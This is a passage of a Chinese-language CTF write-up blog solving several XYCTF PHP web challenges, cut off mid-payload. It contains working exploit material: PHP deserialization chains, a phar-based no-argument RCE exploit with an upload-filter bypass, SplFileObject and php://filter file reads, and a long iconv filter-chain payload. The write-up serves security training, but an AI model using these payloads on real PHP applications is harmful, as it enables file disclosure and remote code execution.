class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>这里让password的地址等于token的地址，那么当token改变的时候，我们的password就会相应地一起改变。</p><p>下一层：fpclosefpclosefpcloseffflllaaaggg.php</p><p>非常基础的反序列化，没有任何技巧，直接给链子。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">E</span>();<br><span class="hljs-variable">$a</span>-&gt;num = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">D</span>();<br><span class="hljs-variable">$a</span>-&gt;num-&gt;lao = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br><span class="hljs-variable">$a</span>-&gt;num-&gt;lao-&gt;luo = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-variable">$a</span>-&gt;num-&gt;lao-&gt;luo-&gt;mack = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>下一层：saber_master_saber_master.php</p><p>主要是这一段：$this-&gt;adwa-&gt;crypto0 !&#x3D; ‘dev1l’ or $this-&gt;adwa-&gt;T1ng !&#x3D; ‘yuroandCMD258’</p><p>我们知道crypto0和T1ng分别在两个类中，adwa不可能既是XYCTFNO2的对象又是XYCTFNO1的对象。</p><h4 id="但是"><a href="#但是" class="headerlink" title="但是"></a>但是</h4><p>反序列化的本质，是我们传入的字符串，而不是题目里的，我们完全可以在XYCTFNO1类里装入crypto0和T1ng两个属性，并让adwa成为这个类的一个Object</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO1</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$crypto0</span>=<span class="hljs-string">&#x27;dev1l&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$T1ng</span>=<span class="hljs-string">&#x27;yuroandCMD258&#x27;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO2</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$adwa</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO3</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$KickyMu</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$N1ght</span> = <span class="hljs-string">&quot;oSthing&quot;</span>;<br>&#125; <br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XYCTFNO3</span>();<br><span class="hljs-variable">$a</span>-&gt;KickyMu = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XYCTFNO2</span>();<br><span class="hljs-variable">$a</span>-&gt;KickyMu-&gt;adwa = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XYCTFNO1</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>最后原生类+伪协议读文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;X&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Y&#x27;</span>]); <br></code></pre></td></tr></table></figure><p>最终payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span>：?CTF=O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;XYCTFNO3&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;KickyMu&quot;</span>;O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;XYCTFNO2&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;adwa&quot;</span>;O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;XYCTFNO1&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;crypto0&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;dev1l&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;T1ng&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;yuroandCMD258&quot;</span>;&#125;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;N1ght&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;oSthing&quot;</span>;&#125;<br><br><span class="hljs-attribute">POST</span>：X=SplFileObject&amp;Y=php://filter/read=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h1 id="pharme"><a href="#pharme" class="headerlink" title="pharme"></a>pharme</h1><p>一眼phar反序列化。源码里提示了class.php，这里可以文件包含。</p><p>1、</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;ch3nx1&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/;+/&#x27;</span>,<span class="hljs-string">&#x27;ch3nx1&#x27;</span>,<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[A-Za-z_\(\)]+/&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;cmd)))&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd.<span class="hljs-string">&#x27;isbigvegetablechicken!&#x27;</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>主要是这段，if条件判断就是限制我们只能使用：A-Za-z _ ( ) ;</p><p>这些东西。很明显是想让我们经行无参数rce。第二个eval那里，后面加了脏数据。可以在命令的最后加上来绕过。</p><p>2、在上传页面，后端会检查我们上传的文件里是否含有__halt_compiler();</p><p>这里我们可以把我们生成的phar文件添加到压缩包里，然后把压缩包名字改成.jpg即可绕过。</p><p>3、在class.php页面的包含点，不能在开头使用phar:&#x2F;&#x2F;，这里可以用</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">compress.zlib:<span class="hljs-regexp">//</span>phar:<span class="hljs-regexp">//</span>/test.phar<br></code></pre></td></tr></table></figure><p>4、我们无参数RCE的命令是随机根目录读文件</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">readfile</span></span>(<span class="hljs-title">array_rand</span>(<span class="hljs-title">array_flip</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">dirname</span>(<span class="hljs-title">dirname</span>(<span class="hljs-title">dirname</span>(<span class="hljs-title">pos</span>(<span class="hljs-title">localeconv</span>()))))))));</span><br></code></pre></td></tr></table></figure><p>5、最终exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&quot;readfile(array_rand(array_flip(scandir(dirname(dirname(dirname(pos(localeconv()))))))));__halt_compiler();&quot;</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">evil</span>();<br><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>); <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>将生成的phar文件压缩，改名jpg后上传，然后在class.php页面包含，多刷新几次就有flag了。</p><h1 id="连连看到底是连连什么看"><a href="#连连看到底是连连什么看" class="headerlink" title="连连看到底是连连什么看"></a>连连看到底是连连什么看</h1><p>源码里只看index，藏了个what’s_this.php，现在源码没用了。这个题出的是最没水平的一个题，首先题目页面的小游戏跟题目毫无关系，其次让我们下载了源码，源码为了让我们知道有这么个php文件，为何要多此一举。</p><p>然后这个what’s_this.php的题也是原题了。在hscctf2024里有，当时一个师傅是非预期，这里不再展示。</p><p>做这道题我们需要一个工具。PHP_INCLUDE_TO_SHELL_CHAR_DICT</p><p>github上有这个工具的源码。</p><p>我们需要修改脚本的这个地方为题目中的&#x2F;etc&#x2F;passwd</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">file_to_use</span> = <span class="hljs-string">&quot;/etc/passwd&quot;</span><br></code></pre></td></tr></table></figure><p>如果直接用这个脚本，生成的数据后方有脏数据，只能过弱比较，但是这里是强比较。</p><p>这里的思路是经过多次的base64加密和解密，扔掉后方的脏数据。由于base64加密的次数不清楚，所以我们需要手动测试。</p><p>把你需要生成的字符串多次base64编码，**每次编码记得删除后面的&#x3D;**，然后解密的时候记得自己在payload后面加上相应次数的|convert.base64-decode<br>多次尝试，直到生成完美的字符串为止。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xl">XYCTF-&gt;WFlDVEY=<br>WF<span class="hljs-function"><span class="hljs-title">lDVEY</span>-&gt;</span>V0ZsRFZFWQ==<br>V0Z<span class="hljs-function"><span class="hljs-title">sRFZFWQ</span>-&gt;</span>VjBac1JGWkZXUQ==<br>V<span class="hljs-function"><span class="hljs-title">jBac1JGWkZXUQ</span>-&gt;</span>VmpCYWMxSkdXa1pYVVE=<br>V<span class="hljs-function"><span class="hljs-title">mpCYWMxSkdXa1pYVVE</span>-&gt;</span>Vm1wQ1lXTXhTa2RYYTFwWVZWRQ==<br>V<span class="hljs-function"><span class="hljs-title">m1wQ1lXTXhTa2RYYTFwWVZWRQ</span>-&gt;</span>Vm0xd1ExbFhUWGhUYTJSWVlURndXVlpXUlE=<br></code></pre></td></tr></table></figure><p>最后经过测试，六次base64编码后得到的字符串Vm0xd1ExbFhUWGhUYTJSWVlURndXVlpXUlE可以使用。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python php_filter_chain_generator<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--chain</span> Vm0xd1ExbFhUWGhUYTJSWVlURndXVlpXUlE<br></code></pre></td></tr></table></figure><p>得到的payload我们取php:&#x2F;&#x2F;filter&#x2F;$p&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd题目需要的$p的部分，并在最后加上六次的base64解密<code>|convert.base64-decode</code></p><p>最终payload：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">?p=convert.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.INIS.UTF16|<span class="hljs-type">convert</span>.iconv.CSIBM1133.IBM943|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.IBM860.UTF16|<span class="hljs-type">convert</span>.iconv.ISO-IR<span class="hljs-number">-143.</span>ISO2022CNEXT|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.JS.UNICODE|<span class="hljs-type">convert</span>.iconv.L4.UCS2|<span class="hljs-type">convert</span>.iconv.UCS<span class="hljs-number">-2.</span>OSF00030010|<span class="hljs-type">convert</span>.iconv.CSIBM1008.UTF32BE|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CP861.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.L4.GB13000|<span class="hljs-type">convert</span>.iconv.BIG5.JOHAB|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CSGB2312.UTF<span class="hljs-number">-32</span>|<span class="hljs-type">convert</span>.iconv.IBM<span class="hljs-number">-1161.</span>IBM932|<span class="hljs-type">convert</span>.iconv.GB13000.UTF16BE|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.864</span>.UTF<span class="hljs-number">-32</span>LE|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.L5.UTF<span class="hljs-number">-32</span>|<span class="hljs-type">convert</span>.iconv.ISO88594.GB13000|<span class="hljs-type">convert</span>.iconv.CP950.SHIFT_JISX0213|<span class="hljs-type">convert</span>.iconv.UHC.JOHAB|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.L4.UTF32|<span class="hljs-type">convert</span>.iconv.CP1250.UCS<span class="hljs-number">-2</span>|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.IBM869.UTF16|<span class="hljs-type">convert</span>.iconv.L3.CSISO90|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.SE2.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.CSIBM1161.IBM<span class="hljs-number">-932</span>|<span class="hljs-type">convert</span>.iconv.BIG5HKSCS.UTF16|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.L5.UTF<span class="hljs-number">-32</span>|<span class="hljs-type">convert</span>.iconv.ISO88594.GB13000|<span class="hljs-type">convert</span>.iconv.CP950.SHIFT_JISX0213|<span class="hljs-type">convert</span>.iconv.UHC.JOHAB|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.SE2.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.CSIBM1161.IBM<span class="hljs-number">-932</span>|<span class="hljs-type">convert</span>.iconv.MS932.MS936|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.JS.UNICODE|<span class="hljs-type">convert</span>.iconv.L4.UCS2|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.UTF16LE|<span class="hljs-type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.iconv.UTF16.EUCTW|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.8859</span>_3.UCS2|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.SE2.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.CSIBM921.NAPLPS|<span class="hljs-type">convert</span>.iconv.CP1163.CSA_T500|<span class="hljs-type">convert</span>.iconv.UCS<span class="hljs-number">-2.</span>MSCP949|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.INIS.UTF16|<span class="hljs-type">convert</span>.iconv.CSIBM1133.IBM943|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CP861.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.L4.GB13000|<span class="hljs-type">convert</span>.iconv.BIG5.JOHAB|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CP-AR.UTF16|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.8859</span>_4.BIG5HKSCS|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.SE2.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.CSIBM921.NAPLPS|<span class="hljs-type">convert</span>.iconv.CP1163.CSA_T500|<span class="hljs-type">convert</span>.iconv.UCS<span class="hljs-number">-2.</span>MSCP949|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CP861.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.L4.GB13000|<span class="hljs-type">convert</span>.iconv.BIG5.JOHAB|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.PT.UTF32|<span class="hljs-type">convert</span>.iconv.KOI8-U.IBM<span class="hljs-number">-932</span>|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CP869.UTF<span class="hljs-number">-32</span>|<span class="hljs-type">convert</span>.iconv.MACUK.UCS4|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CP-AR.UTF16|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.8859</span>_4.BIG5HKSCS|<span class="hljs-type">convert</span>.iconv.MSCP1361.UTF<span class="hljs-number">-32</span>LE|<span class="hljs-type">convert</span>.iconv.IBM932.UCS<span class="hljs-number">-2</span>BE|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.INIS.UTF16|<span class="hljs-type">convert</span>.iconv.CSIBM1133.IBM943|<span class="hljs-type">convert</span>.iconv.GBK.SJIS|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.INIS.UTF16|<span class="hljs-type">convert</span>.iconv.CSIBM1133.IBM943|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CP-AR.UTF16|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.8859</span>_4.BIG5HKSCS|<span class="hljs-type">convert</span>.iconv.MSCP1361.UTF<span class="hljs-number">-32</span>LE|<span class="hljs-type">convert</span>.iconv.IBM932.UCS<span class="hljs-number">-2</span>BE|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CP861.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.L4.GB13000|<span class="hljs-type">convert</span>.iconv.BIG5.JOHAB|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CP861.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.L4.GB13000|<span class="hljs-type">convert</span>.iconv.BIG5.JOHAB|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.JS.UNICODE|<span class="hljs-type">convert</span>.iconv.L4.UCS2|<span class="hljs-type">convert</span>.iconv.UCS<span class="hljs-number">-4</span>LE.OSF05010001|<span class="hljs-type">convert</span>.iconv.IBM912.UTF<span class="hljs-number">-16</span>LE|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.INIS.UTF16|<span class="hljs-type">convert</span>.iconv.CSIBM1133.IBM943|<span class="hljs-type">convert</span>.iconv.GBK.BIG5|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.UTF16LE|<span class="hljs-type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.iconv.UCS2.UTF8|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.8859</span>_3.UCS2|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CP861.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.L4.GB13000|<span class="hljs-type">convert</span>.iconv.BIG5.JOHAB|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CP861.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.L4.GB13000|<span class="hljs-type">convert</span>.iconv.BIG5.JOHAB|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CSGB2312.UTF<span class="hljs-number">-32</span>|<span class="hljs-type">convert</span>.iconv.IBM<span class="hljs-number">-1161.</span>IBM932|<span class="hljs-type">convert</span>.iconv.GB13000.UTF16BE|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.864</span>.UTF<span class="hljs-number">-32</span>LE|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.SE2.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.CSIBM921.NAPLPS|<span class="hljs-type">convert</span>.iconv.CP1163.CSA_T500|<span class="hljs-type">convert</span>.iconv.UCS<span class="hljs-number">-2.</span>MSCP949|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.PT.UTF32|<span class="hljs-type">convert</span>.iconv.KOI8-U.IBM<span class="hljs-number">-932</span>|<span class="hljs-type">convert</span>.iconv.SJIS.EUCJP-WIN|<span class="hljs-type">convert</span>.iconv.L10.UCS4|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.DEC.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.ISO8859<span class="hljs-number">-9.</span>ISO_6937<span class="hljs-number">-2</span>|<span class="hljs-type">convert</span>.iconv.UTF16.GB13000|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CSGB2312.UTF<span class="hljs-number">-32</span>|<span class="hljs-type">convert</span>.iconv.IBM<span class="hljs-number">-1161.</span>IBM932|<span class="hljs-type">convert</span>.iconv.GB13000.UTF16BE|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.864</span>.UTF<span class="hljs-number">-32</span>LE|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.PT.UTF32|<span class="hljs-type">convert</span>.iconv.KOI8-U.IBM<span class="hljs-number">-932</span>|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.PT.UTF32|<span class="hljs-type">convert</span>.iconv.KOI8-U.IBM<span class="hljs-number">-932</span>|<span class="hljs-type">convert</span>.iconv.SJIS.EUCJP-WIN|<span class="hljs-type">convert</span>.iconv.L10.UCS4|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CP-AR.UTF16|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.8859</span>_4.BIG5HKSCS|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.L6.UNICODE|<span class="hljs-type">convert</span>.iconv.CP1282.ISO-IR<span class="hljs-number">-90</span>|<span class="hljs-type">convert</span>.iconv.CSA_T500<span class="hljs-number">-1983.</span>UCS<span class="hljs-number">-2</span>BE|<span class="hljs-type">convert</span>.iconv.MIK.UCS2|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.L6.UNICODE|<span class="hljs-type">convert</span>.iconv.CP1282.ISO-IR<span class="hljs-number">-90</span>|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.JS.UNICODE|<span class="hljs-type">convert</span>.iconv.L4.UCS2|<span class="hljs-type">convert</span>.iconv.UTF16.EUC-JP-MS|<span class="hljs-type">convert</span>.iconv.ISO<span 